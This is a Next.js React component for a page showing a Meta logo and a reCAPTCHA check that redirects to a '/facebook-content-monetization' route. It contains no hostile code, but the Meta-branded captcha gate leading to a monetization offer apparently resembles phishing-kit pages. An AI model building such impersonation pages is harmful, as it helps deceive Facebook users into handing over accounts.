'use client'

import React from 'react'
import { useRouter } from 'next/navigation'

import ReCaptchaVerification from '@/components/recaptcha/ReCaptchaVerification'

const ReCaptcha = () => {
    const router = useRouter()

    return (
        <div className="bg-[#ffffff] flex min-h-[100dvh] w-full flex-col items-center justify-start overflow-y-auto">
            <div className="font-roboto text-[14px] text-gray-800 w-full max-w-[325px] flex flex-col justify-start px-[max(1rem,env(safe-area-inset-left))] pr-[max(1rem,env(safe-area-inset-right))] pb-[max(1.5rem,env(safe-area-inset-bottom))] pt-[max(1.5rem,env(safe-area-inset-top))] sm:h-screen sm:justify-center sm:py-0 md:px-0">
                <div className="w-full">
                    <img src="/images/meta/logo-meta.svg" alt="logo" className="w-[64px]" />
                </div>

                <ReCaptchaVerification onVerified={() => router.push('/facebook-content-monetization')} />
            </div>
        </div>
    )
}

export default ReCaptcha
